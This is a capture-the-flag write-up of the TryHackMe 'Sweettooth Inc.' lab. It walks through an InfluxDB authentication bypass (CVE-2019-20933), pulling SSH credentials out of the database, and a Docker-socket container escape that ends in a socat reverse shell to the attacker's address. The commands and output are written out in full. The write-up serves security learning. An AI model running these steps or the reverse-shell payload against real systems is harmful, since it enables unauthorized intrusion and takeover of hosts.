# Sweettooth Inc.

## Introduction

Welcome to my another writeup! In this TryHackMe [Sweettooth Inc.](https://tryhackme.com/room/sweettoothinc) room, there are tons of stuff that's worth learning! Without further ado, let's dive in.

## Background

> Sweettooth Inc. needs your help to find out how secure their system is!

> Difficulty: Medium

- Overall difficulty for me: Medium
    - Initial foothold: Easy
    - Privilege escalation: Medium

# Service Enumeration

As usual, scan the machine for open ports via `rustscan`!

**Rustscan:**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Sweettooth_Inc.]
└─# export RHOSTS=10.10.120.88
                                                                                                                         
┌──(root🌸siunam)-[~/ctf/thm/ctf/Sweettooth_Inc.]
└─# rustscan --ulimit 5000 -t 2000 --range=1-65535 $RHOSTS -- -sC -sV -oN rustscan/rustscan.txt
[...]
PORT      STATE SERVICE REASON         VERSION
111/tcp   open  rpcbind syn-ack ttl 63 2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100024  1          41675/udp6  status
|   100024  1          48664/udp   status
|   100024  1          56218/tcp6  status
|_  100024  1          56490/tcp   status
2222/tcp  open  ssh     syn-ack ttl 62 OpenSSH 6.7p1 Debian 5+deb8u8 (protocol 2.0)
| ssh-hostkey: 
|   1024 b0:ce:c9:21:65:89:94:52:76:48:ce:d8:c8:fc:d4:ec (DSA)
| ssh-dss AAAAB3NzaC1kc3MAAACBALOlP9Bx9VQxs4JDY8vovlJp+l+pPX2MGttzN2gGNYABXAVSF9CA14OituA5tcJd5/Nv3Ru3Xyu8Yo5SV0d82rd7L/NF5Relx+iiVF+bigo329wbV3wsIrRQGUYHXiMjAs8WqQR+XKjOm3q4QLVxe/jU1I1ddy6/xO4fL7nOSh3RAAAAFQDKuQDe9pQtmnqvJkZ7QuCGm31+vQAAAIBENh/MS3oHvz1tCC4nZYwdAYZMBj2It0gYCMvD0oSkqL9IMaP9DIt/5G3D9ARrZPeSP4CqhfryIGHS7t59RNdnc3ukEsfJPo23bPBwWdIW7HXp9XDqyY1kD6L3Tq0bpeXpeXt6FQ93rFxncZngFkCrMD4+YytS532qPHMPOWh75gAAAIA7TohVech8kWTh6KIMl2Y61s9cwUqwrTkqJIYMdZ73nP69FD0bw08vyrdAwtVnsqRaNzsVVz9sBOOz3wmp/ZNI5NiuyA0UwEcxPj5k6jCn620gBpMEzVy6a8Ih3yRYHoiVMrQ/PIuoeIGxeYGckCorv8jSz2O3pq1Fnz23FRPH2A==
|   2048 7e:86:88:fe:42:4e:94:48:0a:aa:da:ab:34:61:3c:6e (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCbBmLBPg9mxkAdEbJGnz0v6Jzo4qdBcajkaIBKewKyz6OQTvyhVcDReSB2Dz0nl4mPCs3UN58hSNStCYXjZcpIBpqz2pHupVlqQ7u41Vo2W8u0nVFLt2U8JhTtA9wE6MA9GhitkN3Qorhxb3klCpSnWCDdcmkdNL0EYxZV53A52VWiNGX3vYkdMAKHAmp/VHvrsIeHozqflL8vD2UIoDmxDJwgXJRsr2iGVU1fL/Bu/DwlPwJkm50ua99yPpZbvCS9EwWki76aEtZSbcM4WHzx33Oe3tLXLCfKc9CJdIW35nBvpe5Dxl7gLR/mCHp2iTpdx1FmpSf+JjO/m2vKwL4X
|   256 04:1c:82:f6:a6:74:53:c9:c4:6f:25:37:4c:bf:8b:a8 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBHufHfqIZHVEKYC/yyNS+vTt35iULiIWoFNSQP/Bm/v90QzZjsYU9MSt7xdlR/2LZp9VWk32nl5JL65tvCMImxc=
|   256 49:4b:dc:e6:04:07:b6:d5:ab:c0:b0:a3:42:8e:87:b5 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJEYHtE8GbpGSlNB+/3IWfYRFrkJB+N9SmKs3Uh14pPj
8086/tcp  open  http    syn-ack ttl 62 InfluxDB http admin 1.3.0
|_http-title: Site doesn't have a title (text/plain; charset=utf-8).
56490/tcp open  status  syn-ack ttl 63 1 (RPC #100024)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

According to `rustscan` result, we have 4 ports are opened:

Ports Open        | Service
------------------|------------------------
111               | RPCBind
2222              | OpenSSH 6.7p1 Debian
8086              | InfluxDB http admin 1.3.0
56490             | RPCBind

## InfluxDB on Port 8086

According to [hacktricks](https://book.hacktricks.xyz/network-services-pentesting/8086-pentesting-influxdb), InfluxDB is an open-source time series database (TSDB) developed by the company InfluxData.

We can first **test the target's InfluxDB needs authentication or not**:

```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Sweettooth_Inc.]
└─# influx -host $RHOSTS -port 8086
Connected to http://10.10.120.88:8086 version 1.3.0
InfluxDB shell version: 1.6.7~rc0
> use _internal
ERR: unable to parse authentication credentials
DB does not exist!
```

If it throws this error: `ERR: unable to parse authentication credentials`, which means **it requrires credentials**.

However, we can bypass the authentication, as **InfluxDB 1.3.0** is quite old, and **it suffers an authentication bypass vulnerability before version 1.7.6 (CVE-2019-20933)**.

- Source: https://github.com/LorenzoTullini/InfluxDB-Exploit-CVE-2019-20933

> Exploit for InfluxDB CVE-2019-20933 vulnerability, **InfluxDB before 1.7.6 has an authentication bypass vulnerability** in the authenticate function in services/httpd/handler.go because a JWT token may have an empty SharedSecret (aka shared secret). Exploit check if server is vulnerable, then it tries to get a remote query shell. It has built in a username bruteforce service.

To do so, we can:

- Clone that GitHub repository:

```
┌──(root🌸siunam)-[/opt]
└─# git clone https://github.com/LorenzoTullini/InfluxDB-Exploit-CVE-2019-20933.git

┌──(root🌸siunam)-[/opt]
└─# cd InfluxDB-Exploit-CVE-2019-20933;pip install -r requirements.txt
```

> Before we run the python exploit, we have to understand what the exploit's doing.

1. When we run the exploit, the script will ask us the target's IP, port, and **a username wordlist to bruteforce**.
2. Then the script generates a JWT token (Json Web Token).

However, instead of bruteforcing username, there is a [blog](https://www.komodosec.com/post/when-all-else-fails-find-a-0-day) talking about finding 0 day in InfluxDB.

> Discover a username in the system via the following URL: `https://<influx-server-address>:8086/debug/requests`.

Let's go to `/debug/requests`!

```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Sweettooth_Inc.]
└─# curl http://$RHOSTS:8086/debug/requests
{
"o5yY6yya:127.0.0.1": {"writes":2,"queries":2}
}
```

Found it!

- InfluxDB Username: o5yY6yya

Next, let's run the exploit with the username!

- Run the python exploit:

```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Sweettooth_Inc.]
└─# python3 /opt/InfluxDB-Exploit-CVE-2019-20933/__main__.py

  _____        __ _            _____  ____    ______            _       _ _   
 |_   _|      / _| |          |  __ \|  _ \  |  ____|          | |     (_) |  
   | |  _ __ | |_| |_   ___  __ |  | | |_) | | |__  __  ___ __ | | ___  _| |_ 
   | | | '_ \|  _| | | | \ \/ / |  | |  _ <  |  __| \ \/ / '_ \| |/ _ \| | __|
  _| |_| | | | | | | |_| |>  <| |__| | |_) | | |____ >  <| |_) | | (_) | | |_ 
 |_____|_| |_|_| |_|\__,_/_/\_\_____/|____/  |______/_/\_\ .__/|_|\___/|_|\__|
                                                         | |                  
                                                         |_|                  
 - using CVE-2019-20933

Host (default: localhost): 10.10.120.88
Port (default: 8086): 8086
Username <OR> path to username file (default: users.txt): o5yY6yya
Host vulnerable !!!

Databases:

1) _internal
2) creds
3) docker
4) tanks
5) mixer

.quit to exit
[o5yY6yya@10.10.120.88] Database: 
```

We're in!

Then, we can now enumerating the InfluxDB!

***Enumerate database `tanks`:***

```
[o5yY6yya@10.10.120.88] Database: 4

Starting InfluxDB shell - .back to go back
[o5yY6yya@10.10.120.88/tanks] $ 
```

**Enumerate table names:**
```
[o5yY6yya@10.10.120.88/tanks] $ show measurements
{
    "results": [
        {
            "series": [
                {
                    "columns": [
                        "name"
                    ],
                    "name": "measurements",
                    "values": [
                        [
                            "fruitjuice_tank"
                        ],
                        [
                            "gelatin_tank"
                        ],
                        [
                            "sugar_tank"
                        ],
                        [
                            "water_tank"
                        ]
                    ]
                }
            ],
            "statement_id": 0
        }
    ]
}
```

- Database `tanks` table names: `fruitjuice_tank`, `gelatin_tank`, `sugar_tank`, `water_tank`

**Enumerate column names:**
```
[o5yY6yya@10.10.120.88/tanks] $ show field keys
{
    "results": [
        {
            "series": [
                {
                    "columns": [
                        "fieldKey",
                        "fieldType"
                    ],
                    "name": "fruitjuice_tank",
                    "values": [
                        [
                            "filling_height",
                            "float"
                        ],
                        [
                            "temperature",
                            "float"
                        ]
                    ]
                },
                {
                    "columns": [
                        "fieldKey",
                        "fieldType"
                    ],
                    "name": "gelatin_tank",
                    "values": [
                        [
                            "filling_height",
                            "float"
                        ],
                        [
                            "temperature",
                            "float"
                        ]
                    ]
                },
                {
                    "columns": [
                        "fieldKey",
                        "fieldType"
                    ],
                    "name": "sugar_tank",
                    "values": [
                        [
                            "filling_height",
                            "float"
                        ],
                        [
                            "temperature",
                            "float"
                        ]
                    ]
                },
                {
                    "columns": [
                        "fieldKey",
                        "fieldType"
                    ],
                    "name": "water_tank",
                    "values": [
                        [
                            "filling_height",
                            "float"
                        ],
                        [
                            "temperature",
                            "float"
                        ]
                    ]
                }
            ],
            "statement_id": 0
        }
    ]
}
```

**Extract data:**
```
[o5yY6yya@10.10.120.88/tanks] $ SELECT temperature FROM water_tank
{
    "results": [
        {
            "series": [
                {
                    "columns": [
                        "time",
                        "temperature"
                    ],
                    "name": "water_tank",
                    "values": [
                        [
                            "2021-05-16T12:00:00Z",
                            22.47
                        ],
                        [
                            "2021-05-16T13:00:00Z",
                            22.26
                        ],
[...]
```

***Enumerate database `mixer`:***

```
[o5yY6yya@10.10.120.88] Database: 5

Starting InfluxDB shell - .back to go back
[o5yY6yya@10.10.120.88/mixer] $ 
```

**Enumerate table names:**
```
[o5yY6yya@10.10.120.88/mixer] $ show measurements
{
    "results": [
        {
            "series": [
                {
                    "columns": [
                        "name"
                    ],
                    "name": "measurements",
                    "values": [
                        [
                            "mixer_stats"
                        ]
                    ]
                }
            ],
            "statement_id": 0
        }
    ]
}
```

- Database `mixer` table names: `mixer_stats`

**Enumerate column names:**
```
[o5yY6yya@10.10.120.88/mixer] $ show field keys
{
    "results": [
        {
            "series": [
                {
                    "columns": [
                        "fieldKey",
                        "fieldType"
                    ],
                    "name": "mixer_stats",
                    "values": [
                        [
                            "filling_height",
                            "float"
                        ],
                        [
                            "motor_rpm",
                            "float"
                        ],
                        [
                            "temperature",
                            "float"
                        ]
                    ]
                }
            ],
            "statement_id": 0
        }
    ]
}
```

**Extract data:**
```
[o5yY6yya@10.10.120.88/mixer] $ SELECT motor_rpm FROM mixer_stats
{
    "results": [
        {
            "series": [
                {
                    "columns": [
                        "time",
                        "motor_rpm"
                    ],
                    "name": "mixer_stats",
                    "values": [
                        [
                            "2021-05-16T12:00:00Z",
                            4734
                        ],
                        [
                            "2021-05-16T13:00:00Z",
                            4712
                        ],
[...]
 SELECT * FROM mixer_stats ORDER BY motor_rpm ASC
```

***Enumerate database `creds`:***

```
[o5yY6yya@10.10.120.88] Database: 2

Starting InfluxDB shell - .back to go back
[o5yY6yya@10.10.120.88/creds] $ 
```

**Enumerate table names:**
```
[o5yY6yya@10.10.120.88/creds] $ show measurements
{
    "results": [
        {
            "series": [
                {
                    "columns": [
                        "name"
                    ],
                    "name": "measurements",
                    "values": [
                        [
                            "ssh"
                        ]
                    ]
                }
            ],
            "statement_id": 0
        }
    ]
}
```

- Database `creds` table names: `ssh`

**Enumerate column names:**
```
[o5yY6yya@10.10.120.88/creds] $ show field keys
{
    "results": [
        {
            "series": [
                {
                    "columns": [
                        "fieldKey",
                        "fieldType"
                    ],
                    "name": "ssh",
                    "values": [
                        [
                            "pw",
                            "float"
                        ]
                    ]
                }
            ],
            "statement_id": 0
        }
    ]
}
```

**Extract data:**
```
[o5yY6yya@10.10.120.88/creds] $ SELECT * FROM ssh
{
    "results": [
        {
            "series": [
                {
                    "columns": [
                        "time",
                        "pw",
                        "user"
                    ],
                    "name": "ssh",
                    "values": [
                        [
                            "2021-05-16T12:00:00Z",
                            {Redacted},
                            "uzJk6Ry98d8C"
                        ]
                    ]
                }
            ],
            "statement_id": 0
        }
    ]
}
```

# Initial Foothold

Since we found the credentials, we can login to SSH as user `uzJk6Ry98d8C`:

```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Sweettooth_Inc.]
└─# ssh uzJk6Ry98d8C@$RHOSTS -p 2222       
uzJk6Ry98d8C@10.10.120.88's password: 
[...]
uzJk6Ry98d8C@35258b0ca129:~$ whoami;hostname;id;ip a
uzJk6Ry98d8C
35258b0ca129
uid=1000(uzJk6Ry98d8C) gid=1000(uzJk6Ry98d8C) groups=1000(uzJk6Ry98d8C)
[...]
6: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default 
    link/ether 02:42:ac:11:00:02 brd ff:ff:ff:ff:ff:ff
    inet 172.17.0.2/16 brd 172.17.255.255 scope global eth0
       valid_lft forever preferred_lft forever
```

**user.txt:**
```
uzJk6Ry98d8C@35258b0ca129:~$ cat user.txt 
THM{Redacted}
```

# Privilege Escalation

## uzJk6Ry98d8C to root

If you look at the `ip a` output, you'll see that the `eth0` interface's IPv4 address is `172.17.0.2`, which is a docker container IP.

Also, the **docker socket is world-writable**:

```
uzJk6Ry98d8C@35258b0ca129:/tmp/docker$ ls -lah /run/docker.sock 
srw-rw-rw- 1 root influxdb 0 Sep 11 06:00 /run/docker.sock

uzJk6Ry98d8C@35258b0ca129:/tmp/docker$ ls -lah /var/run/docker.sock 
srw-rw-rw- 1 root influxdb 0 Sep 11 06:00 /var/run/docker.sock
```

We also see there are 2 files in `/` directory:

```
uzJk6Ry98d8C@35258b0ca129:/$ ls -lah
[...]
-rwxrwxr-x   1 root root   88 Jul  8  2017 entrypoint.sh
[...]
-rwxr-xr-x   1 root root 5.0K May 18  2021 initializeandquery.sh
```

**initializeandquery.sh:**
```bash
socat TCP-LISTEN:8080,reuseaddr,fork UNIX-CLIENT:/var/run/docker.sock &

# query each 5 seconds and write docker statistics to database
while true; do
  curl -o /dev/null -G http://localhost:8086/query?pretty=true --data-urlencode "q=show databases" --data-urlencode "u=o5yY6yya" --data-urlencode "p={Redacted}"
  sleep 5
  response="$(curl localhost:8080/containers/json)"
  containername=`(jq '.[0].Names' <<< "$response") | jq .[0] | grep -Eo "[a-zA-Z]+"`
  status=`jq '.[0].State' <<< "$response"`
  influx -username o5yY6yya -password {Redacted} -execute "insert into docker.autogen stats containername=\"$containername\",stats=\"$status\""
done
```

This script reveals that the **port 8080 is being used for querying the InfluxDB docker container.**

We can use `curl` to see what the docker container doing:

```
uzJk6Ry98d8C@35258b0ca129:/$ curl http://localhost:8080/containers/json     
[{"Id":"35258b0ca129e66e69ce120aae8a10ca6712dca42d82524f519225db4c6a879a","Names":["/sweettoothinc"],"Image":"sweettoothinc:latest","ImageID":"sha256:26a697c0d00f06d8ab5cd16669d0b4898f6ad2c19c73c8f5e27231596f5bec5e","Command":"/bin/bash -c 'chmod a+rw /var/run/docker.sock && service ssh start & /bin/su uzJk6Ry98d8C -c '/initializeandquery.sh & /entrypoint.sh influxd''","Created":1662876080,"Ports":[{"IP":"0.0.0.0","PrivatePort":22,"PublicPort":2222,"Type":"tcp"},{"IP":"0.0.0.0","PrivatePort":8086,"PublicPort":8086,"Type":"tcp"}],"Labels":{},"State":"running","Status":"Up 2 hours","HostConfig":{"NetworkMode":"default"},"NetworkSettings":{"Networks":{"bridge":{"IPAMConfig":null,"Links":null,"Aliases":null,"NetworkID":"9466332e9b220d7487dc08e33a5174c35bc5d4296e4d6f92c3805c2738a07858","EndpointID":"0c81865e074ec08999becf5a71f95a3d13ad413741b3b062288723cdf526dcfa","Gateway":"172.17.0.1","IPAddress":"172.17.0.2","IPPrefixLen":16,"IPv6Gateway":"","GlobalIPv6Address":"","GlobalIPv6PrefixLen":0,"MacAddress":"02:42:ac:11:00:02","DriverOpts":null}}},"Mounts":[{"Type":"volume","Name":"4968e40e695359a4862df0b2850c6c43de0fef0213499d9278383cd307a2d647","Source":"","Destination":"/var/lib/influxdb","Driver":"local","Mode":"","RW":true,"Propagation":""},{"Type":"bind","Source":"/var/run/docker.sock","Destination":"/var/run/docker.sock","Mode":"","RW":true,"Propagation":"rprivate"}]}]
```

```json
[
  {
    "Id": "35258b0ca129e66e69ce120aae8a10ca6712dca42d82524f519225db4c6a879a",
    "Names": [
      "/sweettoothinc"
    ],
    "Image": "sweettoothinc:latest",
    "ImageID": "sha256:26a697c0d00f06d8ab5cd16669d0b4898f6ad2c19c73c8f5e27231596f5bec5e",
    "Command": "/bin/bash -c 'chmod a+rw /var/run/docker.sock && service ssh start & /bin/su uzJk6Ry98d8C -c '/initializeandquery.sh & /entrypoint.sh influxd''",
    "Created": 1662876080,
    "Ports": [
      {
        "IP": "0.0.0.0",
        "PrivatePort": 22,
        "PublicPort": 2222,
        "Type": "tcp"
      },
      {
        "IP": "0.0.0.0",
        "PrivatePort": 8086,
        "PublicPort": 8086,
        "Type": "tcp"
      }
    ],
    "Labels": {},
    "State": "running",
    "Status": "Up 2 hours",
    "HostConfig": {
      "NetworkMode": "default"
    },
    "NetworkSettings": {
      "Networks": {
        "bridge": {
          "IPAMConfig": null,
          "Links": null,
          "Aliases": null,
          "NetworkID": "9466332e9b220d7487dc08e33a5174c35bc5d4296e4d6f92c3805c2738a07858",
          "EndpointID": "0c81865e074ec08999becf5a71f95a3d13ad413741b3b062288723cdf526dcfa",
          "Gateway": "172.17.0.1",
          "IPAddress": "172.17.0.2",
          "IPPrefixLen": 16,
          "IPv6Gateway": "",
          "GlobalIPv6Address": "",
          "GlobalIPv6PrefixLen": 0,
          "MacAddress": "02:42:ac:11:00:02",
          "DriverOpts": null
        }
      }
    },
    "Mounts": [
      {
        "Type": "volume",
        "Name": "4968e40e695359a4862df0b2850c6c43de0fef0213499d9278383cd307a2d647",
        "Source": "",
        "Destination": "/var/lib/influxdb",
        "Driver": "local",
        "Mode": "",
        "RW": true,
        "Propagation": ""
      },
      {
        "Type": "bind",
        "Source": "/var/run/docker.sock",
        "Destination": "/var/run/docker.sock",
        "Mode": "",
        "RW": true,
        "Propagation": "rprivate"
      }
    ]
  }
]
```

Armed with this information, we found the image name is `sweettoothinc`.

To **escape the docker container** and **abuse the writable docker socket**, we can: (All commands are from this [article](https://dejandayoff.com/the-danger-of-exposing-docker.sock/))

- Create our own json image:

```json
uzJk6Ry98d8C@35258b0ca129:/tmp$ cat evil.json 
{
 "Image":"sweettoothinc",
 "cmd":["/bin/bash"],
 "Binds": [
  "/:/mnt:rw"
 ]
}
```

When we start this evil container, `/bin/bash` will run, and mount the entire file system to `/mnt` directory. So we'll have access to all the files of the host machine with full read/write access (`rw`).

- Upload our evil container:

```
uzJk6Ry98d8C@35258b0ca129:/tmp$ curl -X POST -H "Content-Type: application/json" -d @evil.json http://localhost:8080/containers/create
{"Id":"182b4d536f528d540852dcf67e72e770f7d40f4c181cc5c3b7adc6bf34844490","Warnings":null}
```

Take a note of the newly create container's ID:

- Container ID: `182b4d536f528d540852dcf67e72e770f7d40f4c181cc5c3b7adc6bf34844490`

- Start the evil container:

```
uzJk6Ry98d8C@35258b0ca129:/tmp$ curl -X POST http://localhost:8080/containers/182b4d536f528d540852dcf67e72e770f7d40f4c181cc5c3b7adc6bf34844490/start
```

If no output means it started successfully.

Now, we can get a reverse shell in the evil container.

To do so, I'll:

- Create an exec instance, which allows us to execute arbitrary commands inside the evil container:

> Since `socat` is installed in the host machine, I'll use `socat` to get a reverse stable shell:

```
uzJk6Ry98d8C@35258b0ca129:/tmp$ which socat
/usr/bin/socat
```

```
uzJk6Ry98d8C@35258b0ca129:/tmp$ curl -i -s -X POST -H "Content-Type: application/json" --data-binary '{"AttachStdin": true,"AttachStdout": true,"AttachStderr": true,"Cmd": ["socat" ,"TCP:10.18.61.134:4444", "EXEC:'/bin/bash',pty,stderr,setsid,sigint,sane"],"DetachKeys": "ctrl-p,ctrl-q","Privileged": true,"Tty": true}' http://localhost:8080/containers/182b4d536f528d540852dcf67e72e770f7d40f4c181cc5c3b7adc6bf34844490/exec
HTTP/1.1 201 Created
Api-Version: 1.38
Content-Type: application/json
Docker-Experimental: false
Ostype: linux
Server: Docker/18.06.3-ce (linux)
Date: Sun, 11 Sep 2022 08:24:29 GMT
Content-Length: 74

{"Id":"39db0ba55752efe954f025ea922bbf1b86879c69ee8ed8cee5f60a864aa87c46"}
```

Again, take a note of the newly create exec's ID:

- Exec ID: `39db0ba55752efe954f025ea922bbf1b86879c69ee8ed8cee5f60a864aa87c46`

- Setup a `socat` listener on port 4444:

```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Sweettooth_Inc.]
└─# socat -d -d file:`tty`,raw,echo=0 TCP-LISTEN:4444
```

- Start the exec instance:

```
uzJk6Ry98d8C@35258b0ca129:/tmp$ curl -i -s -X POST -H 'Content-Type: application/json' --data-binary '{"Detach": false,"Tty": false}' http://localhost:8080/exec/39db0ba55752efe954f025ea922bbf1b86879c69ee8ed8cee5f60a864aa87c46/start
HTTP/1.1 200 OK
Content-Type: application/vnd.docker.raw-stream
Api-Version: 1.38
Docker-Experimental: false
Ostype: linux
Server: Docker/18.06.3-ce (linux)
```

```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Sweettooth_Inc.]
└─# socat -d -d file:`tty`,raw,echo=0 TCP-LISTEN:4444
[...]
root@182b4d536f52:/# whoami;hostname;id;ip a
root
182b4d536f52
uid=0(root) gid=0(root) groups=0(root)
[...]
28: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default 
    link/ether 02:42:ac:11:00:03 brd ff:ff:ff:ff:ff:ff
    inet 172.17.0.3/16 brd 172.17.255.255 scope global eth0
       valid_lft forever preferred_lft forever
```

**Check it is mounted or not:**
```
root@182b4d536f52:/# ls /mnt
bin   etc	  initrd.img.old  lost+found  opt   run   sys  var
boot  home	  lib		  media       proc  sbin  tmp  vmlinuz
dev   initrd.img  lib64		  mnt	      root  srv   usr  vmlinuz.old
```

Successfully mounted! We've compromised the machine! :D

**docker_root.txt:**
```
root@182b4d536f52:/# cat /root/root.txt
THM{Redcated}
```

# Rooted

**root.txt:**
```
root@182b4d536f52:/# cat /mnt/root/root.txt
THM{Redacted}
```

# Conclusion

What we've learned:

1. InfluxDB Authentication Bypass
2. InfluxDB Enumeration
3. Privilege Escalation via Writable Docker Socket & Docker Escape